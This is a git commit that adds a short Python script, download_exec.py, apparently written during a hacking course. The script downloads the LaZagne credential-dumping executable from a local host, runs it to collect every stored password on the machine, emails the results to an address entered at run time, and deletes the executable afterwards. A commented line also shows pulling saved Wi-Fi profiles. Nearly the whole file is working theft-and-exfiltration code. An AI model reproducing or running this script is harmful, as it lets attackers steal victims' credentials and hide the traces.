81a797400cfc5ab29fc690c0d5392834b85f125a
syntax-eror <46492218+syntax-eror@users.noreply.github.com>
2019-09-02 17:18:15 -0700

    Create download_exec.py

---
+++ download_exec.py
@@ -0,0 +1,39 @@
+#!/usr/bin/env python3
+
+import os, re, requests, smtplib, subprocess, tempfile
+#import requests - enable http requests module through python
+#os - library for cross-platform os command calls; otherwise you'd have to use
+#subprocess.call and the specific platform commmand
+#tempfile - module to access temp folder on different oses
+
+def download(url):
+    get_response = requests.get(url)
+    file_name = url.split("/")[-1] #split with / as delim -1 for last element in list
+    #print(file_name)
+    #print(get_response) #returns response object
+    #print(get_response.content) #show content of response object
+    with open(file_name, "wb") as out_file: #wb - open file for writing as binary
+        out_file.write(get_response.content)
+        
+def send_email(email, password, message):
+    server = smtplib.SMTP("smtp.gmail.com", 587) #creates instance of an SMTP server using SMTP lib
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+    #(from_addr, to_addr, message)
+    server.quit()
+
+#download("http://rarlab.com/rar/wrar571.exe")
+#download("http://vulnweb.com/acunetix-logo.png")
+
+email = input("Enter email address to send to: ")
+password = input("Enter email password: ")
+
+#command = "netsh wlan show profile" #-show wlan profiles stored on Winx.x computer
+temp_directory = tempfile.gettempdir()
+os.chdir(temp_directory)
+download("http://10.0.2.13/hackfiles/lazagne.exe")
+command = "lazagne.exe all"
+result = subprocess.check_output(command, shell=True)
+send_email(email, password, result)
+os.remove("lazagne.exe") #delete executed file once it finishes
